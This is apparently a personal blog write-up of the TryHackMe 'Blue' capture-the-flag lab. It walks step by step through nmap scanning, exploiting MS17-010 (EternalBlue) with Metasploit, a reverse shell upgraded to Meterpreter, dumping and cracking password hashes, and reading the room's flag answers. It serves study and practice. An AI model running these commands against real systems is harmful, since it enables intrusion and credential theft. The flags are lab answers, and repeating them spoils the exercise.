---
title: "CTF Blue THM"
date: 2024-07-22T18:42:43+10:00
draft: false
toc: false
images:
tags:
  - CTF
  - THM
  - TryHackMe
  - Metasploit
  - Meterpreter
  - SMB
  - nmap 
  - EternalBlue
  - MS17_010
---

**TryHackMe CTF: Blue Room Writeup**  
https://tryhackme.com/r/room/blue  
**Room Information**  

This room was created by ben and DarkStar7471, members of the TryHackMe community. This is my second CTF, and I will document my thought process and actions as I go through the challenges.

**Initial Scanning**

I started by running an Nmap scan on the target IP address:

```
sudo nmap -sC -sV -p- -T4 -vv 10.10.216.233
```

The Nmap scan revealed several open ports:

```
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
```

After reviewing the results, I noticed three ports below 1000, which answered one of the CTF questions.

Given the machine is running Windows 7 Professional with SMB service on port 445, I inferred it could be vulnerable to the MS17-010 (EternalBlue) exploit.

**Exploitation with Metasploit**

To exploit this vulnerability, I launched Metasploit and searched for the appropriate module.

```
msfconsole
search exploit/windows/smb/ms17_010_eternalblue
```

The search returned the module I needed, so I proceeded to use it.

```
use exploit/windows/smb/ms17_010_eternalblue
```

Next, I configured the necessary options:

```
show options
set LHOST <My_IP>
set RHOSTS 10.10.216.233
```

I then ran the exploit.

```
run
```

The exploit was successful, and I gained a command shell on the target machine:

```
[*] Command shell session 1 opened (My_IP:4444 -> 10.10.216.233:49242)
```

**Upgrading to Meterpreter**

To enhance my capabilities on the target, I decided to upgrade the shell to a Meterpreter session. After some research, I found that Metasploit offers a module for this purpose.

```
background
search post/multi/manage/shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
```

I checked the required options and set them accordingly:

```
show options
set SESSION 1
set LHOST <Your_IP>
set LPORT 4433
run
```

I confirmed the Meterpreter session:

```
sessions -l
```

**Privilege Escalation and Flag Discovery**

With the Meterpreter session active, I listed the running processes and selected a system-level process for migration to gain higher privileges.

```
ps
migrate <PID>
```

Having escalated privileges, I proceeded to dump the password hashes:

```
hashdump
```

I used CrackStation to crack the hashes and retrieved the user credentials which was required as a question on the CTF.

I was then asked to locate 3 flags on the system.

**Flag 1**

The CTF mentioned the first flag is located at the system root. I navigated to the C:\ drive and located first flag.

```
meterpreter > cd C:\
meterpreter > ls
meterpreter > cat flag1.txt
flag{access_the_machine}
```

Knowing that the first flag was named flag1.txt I assumed flag 2 and 3 would follow the same naming convention.

I then decided to use the search function to find flags 2 and 3.

**Flag 2**

The second flag is located where Windows stores passwords. I utilised the search function to find it:

```
meterpreter > search -f flag2.txt
Found 1 result...

c:\Windows\System32\config\flag2.txt
```

I navigated to the directory and viewed the contents:

```
meterpreter > cat c:\Windows\System32\config\flag2.txt
flag{sam_database_elevated_access}
```

**Flag 3**

The third flag is located in the user’s documents. Again, I used the search function:

```
meterpreter > search -f flag3.txt
Found 1 result...

c:\Users\Jon\Documents\flag3.txt
```

I navigated to the directory and viewed the contents:

```
meterpreter > cat c:\Users\Jon\Documents\flag3.txt
flag{admin_documents_can_be_valuable}
```

**Conclusion**

This CTF was an excellent learning experience. Running through the Nmap scan helped me identify the open ports and potential vulnerabilities. Utilising Metasploit to exploit the MS17-010 vulnerability and upgrading to a Meterpreter session provided valuable practice in exploiting and navigating a Windows system. Retrieving the flags reinforced my skills in locating sensitive information within a compromised machine. I look forward to tackling more CTF challenges in the future.